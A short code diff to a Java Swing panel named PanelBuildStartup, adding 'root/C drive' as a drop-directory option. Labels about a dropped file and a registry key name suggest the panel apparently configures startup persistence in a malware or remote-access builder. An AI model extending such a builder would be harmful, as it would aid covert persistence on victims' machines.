@@ -62,7 +62,7 @@ public class PanelBuildStartup extends JPanel {
 
 		comboBox = new JComboBox<String>();
 		comboBox.setToolTipText("Drop directory");
-		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "temp/documents (UNIX)", "appdata", "desktop" }));
+		comboBox.setModel(new DefaultComboBoxModel<String>(new String[] { "root/C drive", "temp/documents (UNIX)", "appdata", "desktop" }));
 
 		JLabel lblDroppedFileAnd = new JLabel("Dropped file and reg key name:");
 
